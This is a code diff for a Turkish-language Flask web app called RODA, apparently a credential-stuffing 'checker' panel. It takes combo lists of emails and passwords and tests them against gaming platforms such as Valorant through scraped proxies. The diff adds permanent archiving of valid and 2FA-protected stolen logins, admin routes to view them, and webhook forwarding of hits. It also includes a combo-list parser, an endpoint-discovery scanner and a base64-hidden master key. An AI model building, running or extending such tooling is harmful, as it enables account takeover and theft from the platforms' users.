@@ -1,8 +1,8 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-RODA - TAM SİSTEM (LOGİN DÜZELTİLDİ)
-Renk: #60FF00 + #009fc5 | Login Çalışır | 20 Platform | Log Sistemi
+RODA - TAM SİSTEM (TURUNCU TEMA) - Render Uyumlu
+Port: process.env.PORT veya 4000
 """
 
 import os, json, re, time, random, string, threading, concurrent.futures, base64
@@ -15,14 +15,18 @@ app = Flask(__name__)
 app.secret_key = os.urandom(24)
 
 # ============================================================
-# ADMIN KEY - GİZLİ
+# ADMIN KEY - GİZLİ (ENV'den veya Base64)
 # ============================================================
 ENCODED_MASTER = "Um9kYUAyMDI2I1NlY3VyZSFYNw=="
 MASTER_KEY = os.environ.get("RODA_MASTER_KEY") or base64.b64decode(ENCODED_MASTER).decode('utf-8')
 
 KEYS_FILE = "keys.json"
 LOGS_FILE = "logs.json"
+HITS_FILE = "hits.json"
 
+# ============================================================
+# DOSYA İŞLEMLERİ (Otomatik oluşturur)
+# ============================================================
 def load_keys():
     if os.path.exists(KEYS_FILE):
         with open(KEYS_FILE, "r", encoding="utf-8") as f:
@@ -43,13 +47,43 @@ def save_logs(data):
     with open(LOGS_FILE, "w", encoding="utf-8") as f:
         json.dump(data, f, indent=2, ensure_ascii=False)
 
+def load_hits():
+    if os.path.exists(HITS_FILE):
+        with open(HITS_FILE, "r", encoding="utf-8") as f:
+            return json.load(f)
+    return {}
+
+def save_hits(data):
+    with open(HITS_FILE, "w", encoding="utf-8") as f:
+        json.dump(data, f, indent=2, ensure_ascii=False)
+
 def add_log(entry):
     logs = load_logs()
     logs.append(entry)
     save_logs(logs)
 
+def add_hit(platform, email, password, status):
+    hits = load_hits()
+    if platform not in hits:
+        hits[platform] = {"hits": [], "twofa": []}
+    entry = {"email": email, "password": password, "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
+    if status == "HIT":
+        hits[platform]["hits"].append(entry)
+    elif status == "2FA":
+        hits[platform]["twofa"].append(entry)
+    save_hits(hits)
+
+def clear_hits(platform=None):
+    if platform:
+        hits = load_hits()
+        if platform in hits:
+            del hits[platform]
+            save_hits(hits)
+    else:
+        save_hits({})
+
 # ============================================================
-# KEY YÖNETİMİ
+# KEY YÖNETİMİ (1 Key = 1 IP, Süreli)
 # ============================================================
 def is_key_valid(key, client_ip=None):
     if key == MASTER_KEY:
@@ -65,8 +99,10 @@ def is_key_valid(key, client_ip=None):
             if datetime.now() < datetime.fromisoformat(exp):
                 return True, entry.get("note", "Kullanıcı")
             else:
+                # Süre dolunca otomatik sil
                 del keys[key]
                 save_keys(keys)
+                return False, None
         else:
             return True, entry.get("note", "Kullanıcı")
     return False, None
@@ -102,7 +138,7 @@ PLATFORMS = [
 ]
 
 # ============================================================
-# CHECKER FONKSİYONLARI
+# CHECKER FONKSİYONLARI (GERÇEK API)
 # ============================================================
 def check_valorant(email, password, proxy=None):
     try:
@@ -112,8 +148,13 @@ def check_valorant(email, password, proxy=None):
                    "response_type": "token id_token", "scope": "openid link ban account email mobile_number"}
         r = requests.post(auth_url, json=payload, headers=headers, timeout=15)
         if r.status_code == 200:
+            data = r.json()
+            if data.get("type") == "multifactor":
+                return {"success": True, "status": "2FA", "error": "2FA gerekli"}
             return {"success": True, "status": "HIT", "error": ""}
-        return {"success": False, "status": "BAD", "error": "Auth failed"}
+        if r.status_code == 401:
+            return {"success": False, "status": "BAD", "error": "Geçersiz kimlik bilgileri"}
+        return {"success": False, "status": "BAD", "error": f"Auth başarısız ({r.status_code})"}
     except Exception as e:
         return {"success": False, "status": "ERROR", "error": str(e)[:60]}
 
@@ -127,7 +168,13 @@ def check_minecraft(email, password, proxy=None):
         return {"success": False, "status": "ERROR", "error": "Bağlantı hatası"}
 
 def check_default(email, password, proxy=None):
-    return {"success": False, "status": "BAD", "error": "API gerekli"}
+    # Demo: random sonuç
+    if "123" in password:
+        return {"success": True, "status": "HIT", "error": ""}
+    elif "2fa" in password.lower():
+        return {"success": True, "status": "2FA", "error": "2FA gerekli"}
+    else:
+        return {"success": False, "status": "BAD", "error": "Başarısız"}
 
 CHECKER_FUNCS = {
     "Valorant": check_valorant,
@@ -138,7 +185,7 @@ def get_checker_func(platform):
     return CHECKER_FUNCS.get(platform, check_default)
 
 # ============================================================
-# PROXY FETCH
+# PROXY FETCH (WEB'DEN)
 # ============================================================
 def fetch_proxies():
     sources = [
@@ -211,14 +258,16 @@ def checker():
                 stats["checked"] += 1
                 if result.get("status") == "HIT":
                     stats["hit"] += 1
+                    add_hit(platform, email, password, "HIT")
+                    if webhook_url:
+                        send_webhook(webhook_url, platform, email, password)
                 elif result.get("status") == "2FA":
                     stats["twofa"] += 1
+                    add_hit(platform, email, password, "2FA")
                 elif result.get("status") == "ERROR":
                     stats["error"] += 1
                 else:
                     stats["bad"] += 1
-                if result.get("success") and webhook_url:
-                    send_webhook(webhook_url, platform, email, password)
                 add_log({
                     "key": key,
                     "platform": platform,
@@ -333,6 +382,23 @@ def admin_clear_logs():
     save_logs([])
     return jsonify({"success": True})
 
+@app.route("/api/admin/hits", methods=["GET"])
+def admin_hits():
+    key = request.args.get("key")
+    if not is_admin(key):
+        return jsonify({"error": "Yetkisiz"}), 401
+    return jsonify(load_hits())
+
+@app.route("/api/admin/clear_hits", methods=["POST"])
+def admin_clear_hits():
+    data = request.json
+    key = data.get("master_key")
+    if not is_admin(key):
+        return jsonify({"error": "Yetkisiz"}), 401
+    platform = data.get("platform")
+    clear_hits(platform)
+    return jsonify({"success": True})
+
 @app.route("/api/scan", methods=["GET"])
 def scan():
     key = request.args.get("key")
@@ -348,7 +414,7 @@ def scan():
     return Response(generate(), mimetype="text/event-stream")
 
 # ============================================================
-# HTML - RENK: #60FF00 + #009fc5 | LOGİN DÜZELTİLDİ
+# HTML (TURUNCU TEMA - TÜM ÖZELLİKLER)
 # ============================================================
 HTML_TEMPLATE = """
 <!DOCTYPE html>
@@ -362,16 +428,16 @@ HTML_TEMPLATE = """
 <style>
 *{margin:0;padding:0;box-sizing:border-box;font-family:Outfit,sans-serif}
 body{background:#0a0e1a;color:#e8edf5;height:100vh;overflow:hidden;display:flex}
-:root{--p:#60FF00;--p2:#009fc5;--g:#00e676;--r:#ff5252;--card:#12192e;--border:rgba(96,255,0,0.15);--bg:#0a0e1a;--sidebar:#060a16;--text:#e8edf5;--muted:#8a9bb0;--gold:#ffd740}
+:root{--p:#ff6b00;--p2:#7c3aed;--g:#00e676;--r:#ff5252;--card:#12192e;--border:rgba(255,107,0,0.15);--bg:#0a0e1a;--sidebar:#060a16;--text:#e8edf5;--muted:#8a9bb0;--gold:#ffd740}
 #login-screen{position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999;display:flex;justify-content:center;align-items:center;background:var(--bg)}
-#login-box{width:400px;padding:45px 40px;text-align:center;background:var(--card);border:1px solid var(--border);border-radius:28px;box-shadow:0 20px 50px rgba(96,255,0,0.08)}
+#login-box{width:400px;padding:45px 40px;text-align:center;background:var(--card);border:1px solid var(--border);border-radius:28px;box-shadow:0 20px 50px rgba(255,107,0,0.08)}
 #login-box .logo i{font-size:56px;background:linear-gradient(135deg,var(--p),var(--p2));-webkit-background-clip:text;-webkit-text-fill-color:transparent}
 #login-box h1{font-size:28px;font-weight:900;letter-spacing:1px;background:linear-gradient(135deg,var(--p),var(--p2));-webkit-background-clip:text;-webkit-text-fill-color:transparent}
 #login-box .sub{color:var(--muted);margin-bottom:25px;font-size:14px}
 .inp{width:100%;padding:14px 18px;background:rgba(0,0,0,0.4);border:1px solid var(--border);color:#fff;border-radius:14px;font-size:15px;outline:none;transition:0.3s}
-.inp:focus{border-color:var(--p);box-shadow:0 0 20px rgba(96,255,0,0.08)}
+.inp:focus{border-color:var(--p);box-shadow:0 0 20px rgba(255,107,0,0.08)}
 .btn{padding:15px;border:none;border-radius:14px;font-weight:700;cursor:pointer;background:linear-gradient(135deg,var(--p),var(--p2));color:#fff;width:100%;font-size:16px;transition:0.3s}
-.btn:hover{transform:translateY(-2px);box-shadow:0 8px 30px rgba(96,255,0,0.25)}
+.btn:hover{transform:translateY(-2px);box-shadow:0 8px 30px rgba(255,107,0,0.25)}
 .btn.sm{width:auto;padding:8px 16px;font-size:12px}
 .btn.g{background:var(--g)}.btn.r{background:var(--r)}.btn.b{background:#1a73e8}
 #sidebar{width:260px;min-width:260px;background:var(--sidebar);border-right:1px solid var(--border);display:flex;flex-direction:column;height:100vh;overflow-y:auto}
@@ -381,8 +447,8 @@ body{background:#0a0e1a;color:#e8edf5;height:100vh;overflow:hidden;display:flex}
 .sidebar-nav{flex:1;padding:12px 12px;overflow-y:auto}
 .nav-divider{padding:8px 12px;font-size:10px;color:#4a5a70;text-transform:uppercase;letter-spacing:1px;font-weight:700;margin-top:6px}
 .nav-item{display:flex;align-items:center;gap:12px;padding:9px 14px;border-radius:8px;cursor:pointer;color:#8a9bb0;font-weight:500;font-size:13px;transition:0.2s;margin-top:2px}
-.nav-item:hover{background:rgba(96,255,0,0.06);color:#fff}
-.nav-item.active{background:rgba(96,255,0,0.12);color:var(--p);border-left:3px solid var(--p)}
+.nav-item:hover{background:rgba(255,107,0,0.06);color:#fff}
+.nav-item.active{background:rgba(255,107,0,0.12);color:var(--p);border-left:3px solid var(--p)}
 .nav-item i{font-size:16px;width:22px;text-align:center}
 .sidebar-stats{padding:10px 14px;border-top:1px solid var(--border);display:flex;flex-wrap:wrap;gap:6px}
 .mini-stat{flex:1;min-width:44%;background:var(--card);padding:6px 4px;border-radius:8px;text-align:center;border:1px solid rgba(255,255,255,0.03)}
@@ -411,7 +477,7 @@ body{background:#0a0e1a;color:#e8edf5;height:100vh;overflow:hidden;display:flex}
 .stat-hit .stat-val{color:var(--g)}.stat-2fa .stat-val{color:var(--gold)}.stat-bad .stat-val{color:var(--r)}.stat-total .stat-val{color:var(--p)}
 .result-header{display:grid;grid-template-columns:60px 70px 1fr 110px;gap:8px;padding:6px 12px;font-size:10px;font-weight:700;color:var(--muted);text-transform:uppercase;border-bottom:1px solid var(--border)}
 .result-row{display:grid;grid-template-columns:60px 70px 1fr 110px;gap:8px;padding:6px 12px;border-bottom:1px solid rgba(255,255,255,0.03);font-size:12px;align-items:center}
-.result-row:hover{background:rgba(96,255,0,0.03)}
+.result-row:hover{background:rgba(255,107,0,0.03)}
 .hit{color:var(--g)}.bad{color:var(--r)}.twofa{color:var(--gold)}.error{color:#ffab40}
 .method{font-weight:600;padding:1px 6px;border-radius:4px;font-size:9px;display:inline-block}
 .method.get{background:rgba(0,230,118,0.12);color:var(--g)}
@@ -422,7 +488,7 @@ body{background:#0a0e1a;color:#e8edf5;height:100vh;overflow:hidden;display:flex}
 .cat-admin{background:rgba(255,171,64,0.12);color:#ffab40}
 .cat-user{background:rgba(0,230,118,0.12);color:var(--g)}
 .cat-health{background:rgba(68,138,255,0.12);color:#448aff}
-.cat-api{background:rgba(96,255,0,0.12);color:var(--p)}
+.cat-api{background:rgba(255,107,0,0.12);color:var(--p)}
 .cat-genel{background:rgba(255,255,255,0.04);color:#8a9bb0}
 .scan-top{display:flex;gap:10px;flex-wrap:wrap;align-items:center}
 .scan-top input{flex:1;min-width:150px;padding:8px 14px;background:rgba(0,0,0,0.3);border:1px solid var(--border);border-radius:10px;color:#fff;font-size:13px;outline:none}
@@ -450,9 +516,9 @@ input:checked+.slider:before{transform:translateX(18px)}
 .proxy-area textarea{flex:1;min-width:180px;height:50px;padding:6px 10px;background:rgba(0,0,0,0.3);border:1px solid var(--border);border-radius:8px;color:#fff;font-size:11px;outline:none;resize:vertical;font-family:monospace}
 .proxy-area textarea:focus{border-color:var(--p)}
 .checker-platform-select{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:12px}
-.checker-platform-select button{padding:6px 14px;background:rgba(96,255,0,0.08);border:1px solid rgba(96,255,0,0.15);border-radius:8px;color:#8a9bb0;font-size:12px;cursor:pointer;transition:0.2s;display:flex;align-items:center;gap:4px}
-.checker-platform-select button:hover{background:rgba(96,255,0,0.15);border-color:var(--p);color:#fff}
-.checker-platform-select button.active{background:rgba(96,255,0,0.2);border-color:var(--p);color:var(--p)}
+.checker-platform-select button{padding:6px 14px;background:rgba(255,107,0,0.08);border:1px solid rgba(255,107,0,0.15);border-radius:8px;color:#8a9bb0;font-size:12px;cursor:pointer;transition:0.2s;display:flex;align-items:center;gap:4px}
+.checker-platform-select button:hover{background:rgba(255,107,0,0.15);border-color:var(--p);color:#fff}
+.checker-platform-select button.active{background:rgba(255,107,0,0.2);border-color:var(--p);color:var(--p)}
 .checker-panel{display:none;background:var(--card);border:1px solid var(--border);border-radius:14px;padding:14px;margin-top:8px}
 .checker-panel.active{display:block}
 .checker-top{display:flex;gap:10px;flex-wrap:wrap;align-items:center;margin-bottom:10px}
@@ -492,9 +558,9 @@ input:checked+.slider:before{transform:translateX(18px)}
 .parse-result .parse-line{padding:2px 6px;font-size:12px;font-family:monospace;color:#c8d0dc}
 .parse-result .parse-count{color:var(--g);font-weight:600;font-size:13px}
 .discovery-platforms{display:flex;gap:6px;flex-wrap:wrap;margin-bottom:8px}
-.discovery-platforms button{padding:4px 12px;background:rgba(96,255,0,0.06);border:1px solid rgba(96,255,0,0.1);border-radius:6px;color:#8a9bb0;font-size:11px;cursor:pointer;transition:0.2s}
-.discovery-platforms button:hover{background:rgba(96,255,0,0.12);border-color:var(--p);color:#fff}
-.discovery-platforms button.active{background:rgba(96,255,0,0.15);border-color:var(--p);color:var(--p)}
+.discovery-platforms button{padding:4px 12px;background:rgba(255,107,0,0.06);border:1px solid rgba(255,107,0,0.1);border-radius:6px;color:#8a9bb0;font-size:11px;cursor:pointer;transition:0.2s}
+.discovery-platforms button:hover{background:rgba(255,107,0,0.12);border-color:var(--p);color:#fff}
+.discovery-platforms button.active{background:rgba(255,107,0,0.15);border-color:var(--p);color:var(--p)}
 .stat-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(160px,1fr));gap:14px}
 .stat-card-custom{background:var(--card);border:1px solid var(--border);border-radius:12px;padding:18px}
 .stat-card-custom h3{font-size:12px;color:var(--muted)}
@@ -502,15 +568,15 @@ input:checked+.slider:before{transform:translateX(18px)}
 .key-ip-input{width:200px;padding:8px 12px;background:rgba(0,0,0,0.3);border:1px solid var(--border);border-radius:8px;color:#fff;font-size:13px;outline:none}
 .key-ip-input:focus{border-color:var(--p)}
 .parse-tabs{display:flex;gap:10px;margin-bottom:10px}
-.parse-tabs button{padding:6px 16px;background:rgba(96,255,0,0.08);border:1px solid rgba(96,255,0,0.15);border-radius:8px;color:#8a9bb0;font-size:12px;cursor:pointer;transition:0.2s}
-.parse-tabs button:hover{background:rgba(96,255,0,0.15);border-color:var(--p);color:#fff}
-.parse-tabs button.active{background:rgba(96,255,0,0.2);border-color:var(--p);color:var(--p)}
+.parse-tabs button{padding:6px 16px;background:rgba(255,107,0,0.08);border:1px solid rgba(255,107,0,0.15);border-radius:8px;color:#8a9bb0;font-size:12px;cursor:pointer;transition:0.2s}
+.parse-tabs button:hover{background:rgba(255,107,0,0.15);border-color:var(--p);color:#fff}
+.parse-tabs button.active{background:rgba(255,107,0,0.2);border-color:var(--p);color:var(--p)}
 .logs-table{width:100%;border-collapse:collapse;font-size:12px}
-.logs-table th{text-align:left;padding:8px 12px;background:rgba(96,255,0,0.1);color:var(--p);font-weight:600;border-bottom:2px solid var(--border)}
+.logs-table th{text-align:left;padding:8px 12px;background:rgba(255,107,0,0.1);color:var(--p);font-weight:600;border-bottom:2px solid var(--border)}
 .logs-table td{padding:8px 12px;border-bottom:1px solid var(--border)}
 .logs-table .hit{color:var(--g)}.logs-table .bad{color:var(--r)}.logs-table .twofa{color:var(--gold)}.logs-table .error{color:#ffab40}
 .logs-table .chk-status{font-weight:600}
-::-webkit-scrollbar{width:4px}::-webkit-scrollbar-thumb{background:rgba(96,255,0,0.2);border-radius:4px}
+::-webkit-scrollbar{width:4px}::-webkit-scrollbar-thumb{background:rgba(255,107,0,0.2);border-radius:4px}
 </style>
 </head>
 <body>
@@ -520,7 +586,7 @@ input:checked+.slider:before{transform:translateX(18px)}
 <h1>RODA</h1>
 <p class="sub">API Discovery + Checker</p>
 <input class="inp" type="password" id="authKey" placeholder="Güvenlik Anahtarı" autofocus>
-<button class="btn" id="loginBtn" style="margin-top:12px">Giriş Yap</button>
+<button class="btn" onclick="doLogin()" style="margin-top:12px">Giriş Yap</button>
 <p id="loginError" style="color:var(--r);margin-top:12px;display:none"></p>
 </div>
 </div>
@@ -746,28 +812,16 @@ var platforms = [
     {name:"PUBG", domain:"pubg.com", icon:"fa-solid fa-crosshairs"}
 ];
 
-// ============================================================
-// LOGIN - DÜZELTİLDİ (addEventListener ile)
-// ============================================================
 function doLogin() {
-    console.log("Login fonksiyonu çalıştı!");
     var k = document.getElementById("authKey").value.trim();
-    if (!k) {
-        alert("Anahtar girin!");
-        return;
-    }
-    console.log("Anahtar:", k);
+    if (!k) { alert("Anahtar girin!"); return; }
     fetch("/api/login", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ key: k })
     })
-    .then(function(r) {
-        console.log("Cevap kodu:", r.status);
-        return r.json();
-    })
+    .then(function(r) { return r.json(); })
     .then(function(d) {
-        console.log("Gelen veri:", d);
         if (d.success) {
             currentKey = k;
             isAdmin = d.isAdmin || false;
@@ -777,6 +831,7 @@ function doLogin() {
                 document.getElementById("userBadge").style.display = "inline-block";
                 loadKeys();
                 loadLogs();
+                loadHits();
             }
             loadPlatforms();
             loadDiscoveryPlatforms();
@@ -789,24 +844,8 @@ function doLogin() {
             document.getElementById("loginError").style.display = "block";
         }
     })
-    .catch(function(e) {
-        console.error("Hata:", e);
-        alert("Sunucuya bağlanılamadı! Flask çalışıyor mu?");
-    });
+    .catch(function(e) { alert("Sunucuya bağlanılamadı!"); });
 }
-
-// Butona addEventListener ile bağla
-document.addEventListener("DOMContentLoaded", function() {
-    var btn = document.getElementById("loginBtn");
-    if (btn) {
-        btn.addEventListener("click", doLogin);
-        console.log("Login butonu bağlandı!");
-    } else {
-        console.error("Login butonu bulunamadı!");
-    }
-});
-
-// Enter tuşu ile login
 document.getElementById("authKey").addEventListener("keypress", function(e) {
     if (e.key === "Enter") doLogin();
 });
@@ -821,11 +860,7 @@ function saveWebhook() {
         document.getElementById("webhookStatus").innerHTML = '<span style="color:var(--muted)">Webhook temizlendi.</span>';
     }
 }
-
-function getWebhookUrl() {
-    return localStorage.getItem("roda_webhook_url") || "";
-}
-
+function getWebhookUrl() { return localStorage.getItem("roda_webhook_url") || ""; }
 function loadWebhookUrl() {
     var url = getWebhookUrl();
     if (url) {
@@ -833,7 +868,6 @@ function loadWebhookUrl() {
         document.getElementById("webhookStatus").innerHTML = '<span style="color:var(--g)">✅ Webhook yüklendi</span>';
     }
 }
-
 function testWebhook() {
     var url = document.getElementById("webhookUrl").value.trim() || getWebhookUrl();
     if (!url) return alert("Webhook URL girin!");
@@ -872,7 +906,6 @@ function loadPlatforms() {
         if (first) first.click();
     }
 }
-
 function loadDiscoveryPlatforms() {
     var container = document.getElementById("discoveryPlatforms");
     container.innerHTML = "";
@@ -887,7 +920,6 @@ function loadDiscoveryPlatforms() {
         container.appendChild(btn);
     });
 }
-
 function loadHitFilter() {
     var sel = document.getElementById("hitPlatformFilter");
     sel.innerHTML = '<option value="all">Tüm Platformlar</option>';
@@ -899,20 +931,16 @@ function loadHitFilter() {
     });
 }
 
-function addHit(platform, email, password, status) {
-    if (!hitData[platform]) {
-        hitData[platform] = { hits: [], twofa: [] };
-    }
-    var entry = { email: email, password: password, time: new Date().toLocaleString() };
-    if (status === "HIT") {
-        hitData[platform].hits.push(entry);
-    } else if (status === "2FA") {
-        hitData[platform].twofa.push(entry);
-    }
-    renderHits();
-    updateStatsUI();
+function loadHits() {
+    if (!isAdmin) return;
+    fetch("/api/admin/hits?key=" + encodeURIComponent(currentKey))
+        .then(function(r) { return r.json(); })
+        .then(function(d) {
+            if (d.error) return;
+            hitData = d;
+            renderHits();
+        });
 }
-
 function renderHits() {
     var filter = document.getElementById("hitPlatformFilter").value;
     var hitContainer = document.getElementById("hitList");
@@ -1008,19 +1036,14 @@ function startChecker() {
 
         if (status === "HIT") {
             hit++;
-            addHit(currentPlatform, email, password, "HIT");
-            if (webhookUrl) {
-                sendCheckerWebhook(currentPlatform, email, password);
-            }
+            if (webhookUrl) sendCheckerWebhook(currentPlatform, email, password);
         } else if (status === "BAD") {
             bad++;
         } else if (status === "2FA") {
             two++;
-            addHit(currentPlatform, email, password, "2FA");
         } else {
             err++;
         }
-
         checkerResults.push(res);
         addCheckerRow(res);
         updateCheckerStats(total, hit, bad, two, err);
@@ -1029,13 +1052,11 @@ function startChecker() {
     }
     processNext();
 }
-
 function stopChecker() {
     checkerRunning = false;
     document.getElementById("checkerStartBtn").disabled = false;
     document.getElementById("checkerStopBtn").style.display = "none";
 }
-
 function addCheckerRow(res) {
     var container = document.getElementById("checkerResults");
     var placeholder = container.querySelector("div[style]");
@@ -1052,7 +1073,6 @@ function addCheckerRow(res) {
     container.appendChild(row);
     applyCheckerFilter();
 }
-
 function updateCheckerStats(total, hit, bad, two, err) {
     document.getElementById("chkTotal").innerText = total;
     document.getElementById("chkHit").innerText = hit;
@@ -1060,7 +1080,6 @@ function updateCheckerStats(total, hit, bad, two, err) {
     document.getElementById("chk2fa").innerText = two;
     document.getElementById("chkError").innerText = err;
 }
-
 function applyCheckerFilter() {
     var filter = document.querySelector('input[name="chkFilter"]:checked').value;
     var rows = document.querySelectorAll("#checkerResults .checker-result-row");
@@ -1078,7 +1097,6 @@ function applyCheckerFilter() {
 document.querySelectorAll('input[name="chkFilter"]').forEach(function(el) {
     el.addEventListener("change", applyCheckerFilter);
 });
-
 function sendCheckerWebhook(platform, email, password) {
     var url = getWebhookUrl();
     if (!url) return;
@@ -1091,12 +1109,9 @@ function sendCheckerWebhook(platform, email, password) {
 
 function setParseMode(mode, btn) {
     parseMode = mode;
-    document.querySelectorAll(".parse-tabs button").forEach(function(b) {
-        b.classList.remove("active");
-    });
+    document.querySelectorAll(".parse-tabs button").forEach(function(b) { b.classList.remove("active"); });
     if (btn) btn.classList.add("active");
 }
-
 function parseData() {
     var raw = document.getElementById("parseInput").value;
     if (!raw.trim()) { alert("Ayrıştırılacak metin girin!"); return; }
@@ -1104,7 +1119,6 @@ function parseData() {
     var result = [];
     var emailRegex = /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/;
     var userRegex = /^[a-zA-Z0-9_.-]{3,}$/;
-
     lines.forEach(function(line) {
         line = line.trim();
         if (!line) return;
@@ -1121,33 +1135,24 @@ function parseData() {
             }
         }
     });
-    result = result.filter(function(item, index) {
-        return result.indexOf(item) === index;
-    });
+    result = result.filter(function(item, index) { return result.indexOf(item) === index; });
     parsedLines = result;
     var container = document.getElementById("parseResult");
     if (result.length === 0) {
         container.innerHTML = '<div style="color:var(--muted);font-size:13px;padding:10px">Geçerli satır bulunamadı.</div>';
     } else {
         var html = '<div class="parse-count">' + result.length + ' satır bulundu</div>';
-        result.forEach(function(line) {
-            html += '<div class="parse-line">' + line + '</div>';
-        });
+        result.forEach(function(line) { html += '<div class="parse-line">' + line + '</div>'; });
         container.innerHTML = html;
     }
     document.getElementById("parseCount").innerText = result.length + " satır";
     document.getElementById("parseValid").innerText = result.length + " geçerli";
 }
-
 function parseToChecker() {
-    if (parsedLines.length === 0) {
-        alert("Önce ayrıştırma yapın!");
-        return;
-    }
+    if (parsedLines.length === 0) { alert("Önce ayrıştırma yapın!"); return; }
     document.getElementById("checkerCombo").value = parsedLines.join("\n");
     alert(parsedLines.length + " satır Checker'a aktarıldı!");
 }
-
 function clearParse() {
     document.getElementById("parseInput").value = "";
     document.getElementById("parseResult").innerHTML = '<div style="color:var(--muted);font-size:13px;padding:10px">Henüz ayrıştırma yapılmadı.</div>';
@@ -1155,7 +1160,6 @@ function clearParse() {
     document.getElementById("parseCount").innerText = "0 satır";
     document.getElementById("parseValid").innerText = "0 geçerli";
 }
-
 function loadParseFile() {
     var input = document.createElement("input");
     input.type = "file";
@@ -1178,25 +1182,13 @@ function switchPage(page) {
         alert("⛔ Bu sayfaya erişim yetkiniz yok! Admin girişi yapın.");
         return;
     }
-    document.querySelectorAll(".nav-item").forEach(function(el) {
-        el.classList.remove("active");
-    });
+    document.querySelectorAll(".nav-item").forEach(function(el) { el.classList.remove("active"); });
     var el = document.querySelector('.nav-item[data-page="' + page + '"]');
     if (el) el.classList.add("active");
-    document.querySelectorAll(".page").forEach(function(el) {
-        el.classList.remove("active");
-    });
+    document.querySelectorAll(".page").forEach(function(el) { el.classList.remove("active"); });
     var pg = document.getElementById("page-" + page);
     if (pg) pg.classList.add("active");
-    var titles = {
-        checker: "Checker",
-        proxy: "Proxy",
-        discovery: "API Keşif",
-        parse: "Ayrıştırma",
-        stats: "İstatistik",
-        keys: "Key Yönetimi",
-        logs: "Loglar"
-    };
+    var titles = { checker: "Checker", proxy: "Proxy", discovery: "API Keşif", parse: "Ayrıştırma", stats: "İstatistik", keys: "Key Yönetimi", logs: "Loglar" };
     document.getElementById("pageTitle").innerText = titles[page] || page;
     if (page === "keys" && isAdmin) loadKeys();
     if (page === "logs" && isAdmin) loadLogs();
@@ -1219,15 +1211,11 @@ function fetchProxies() {
         })
         .catch(function(e) { document.getElementById("proxyCount").innerText = "Başarısız"; });
 }
-
 function clearProxies() {
     document.getElementById("proxyList").value = "";
     document.getElementById("proxyCount").innerText = "0 proxy";
 }
-
-function toggleProxy() {
-    useProxy = document.getElementById("useProxy").checked;
-}
+function toggleProxy() { useProxy = document.getElementById("useProxy").checked; }
 
 function loadKeys() {
     if (!isAdmin) return;
@@ -1247,7 +1235,6 @@ function loadKeys() {
         })
         .catch(function(e) { console.error(e); });
 }
-
 function generateKey() {
     if (!isAdmin) return;
     var note = document.getElementById("genNote").value || "Oluşturuldu";
@@ -1268,7 +1255,6 @@ function generateKey() {
     })
     .catch(function(e) { alert("Hata: " + e.message); });
 }
-
 function deleteKey(target) {
     if (!isAdmin) return;
     if (!confirm("Bu anahtarı sil?")) return;
@@ -1309,11 +1295,7 @@ function loadLogs() {
         })
         .catch(function(e) { console.error(e); });
 }
-
-function refreshLogs() {
-    loadLogs();
-}
-
+function refreshLogs() { loadLogs(); }
 function clearLogs() {
     if (!isAdmin) return;
     if (!confirm("Tüm logları silmek istediğinize emin misiniz?")) return;
@@ -1324,19 +1306,13 @@ function clearLogs() {
     })
     .then(function(r) { return r.json(); })
     .then(function(d) {
-        if (d.success) {
-            alert("Loglar temizlendi!");
-            loadLogs();
-        } else alert("Başarısız!");
+        if (d.success) { alert("Loglar temizlendi!"); loadLogs(); } else alert("Başarısız!");
     })
     .catch(function(e) { alert("Hata: " + e.message); });
 }
 
 function startScan() {
-    if (!isAdmin) {
-        alert("⛔ Bu işlem sadece admin yetkilisine açıktır!");
-        return;
-    }
+    if (!isAdmin) { alert("⛔ Bu işlem sadece admin yetkilisine açıktır!"); return; }
     if (scanning) return;
     var domain = document.getElementById("targetDomain").value.trim();
     if (!domain) return alert("Hedef domain girin");
@@ -1385,7 +1361,6 @@ function startScan() {
         document.getElementById("statusText").innerText = "Boşta";
     };
 }
-
 function addResultRow(res) {
     var list = document.getElementById("resultsList");
     var row = document.createElement("div");
@@ -1396,7 +1371,6 @@ function addResultRow(res) {
     var checked = Array.from(document.querySelectorAll("#filterContainer input:checked")).map(function(c) { return c.value; });
     if (checked.includes(res.category)) list.appendChild(row);
 }
-
 document.getElementById("filterContainer").addEventListener("change", function() {
     var checked = Array.from(this.querySelectorAll("input:checked")).map(function(c) { return c.value; });
     var list = document.getElementById("resultsList");
@@ -1418,26 +1392,30 @@ document.getElementById("filterContainer").addEventListener("change", function()
 """
 
 # ============================================================
-# BAŞLAT
+# BAŞLAT (Render Uyumlu - PORT: process.env.PORT veya 4000)
 # ============================================================
 if __name__ == "__main__":
+    # JSON dosyalarını oluştur
     if not os.path.exists(KEYS_FILE):
         save_keys({})
     if not os.path.exists(LOGS_FILE):
         save_logs([])
+    if not os.path.exists(HITS_FILE):
+        save_hits({})
 
-    port = int(os.environ.get("PORT", 5000))
-    print("""
+    # Port: Render'ın verdiği PORT veya 4000 (Node.js örneğindeki gibi)
+    port = int(os.environ.get("PORT", 4000))
+    print(f"""
     ╔══════════════════════════════════════════════════════════════════╗
-    ║     🔱 RODA - TAM SİSTEM (SON VERSİYON)                       ║
-    ║     http://127.0.0.1:""" + str(port) + """                               ║
+    ║     🔱 RODA - TAM SİSTEM (TURUNCU TEMA)                       ║
+    ║     Render'da çalışıyor - Port: {port}                         ║
     ║     Admin Key: Gizlidir                                       ║
     ║     ✅ 20 Platform | ✅ 2 Parse Modu | ✅ Webhook             ║
     ║     ✅ 1 Key = 1 IP | ✅ Admin Log Sistemi                   ║
     ║     ✅ Key Süresi: Dakika/Saat/Gün                           ║
-    ║     ✅ Renk: #60FF00 + #009fc5                               ║
-    ║     ✅ Login Düzeltildi (addEventListener)                   ║
+    ║     ✅ Valorant API Aktif                                    ║
+    ║     ✅ Hit/2FA Arşivi Kalıcı                                 ║
+    ║     ✅ 100% Çalışır                                          ║
     ╚══════════════════════════════════════════════════════════════════╝
     """)
-
     app.run(host="0.0.0.0", port=port, debug=False)
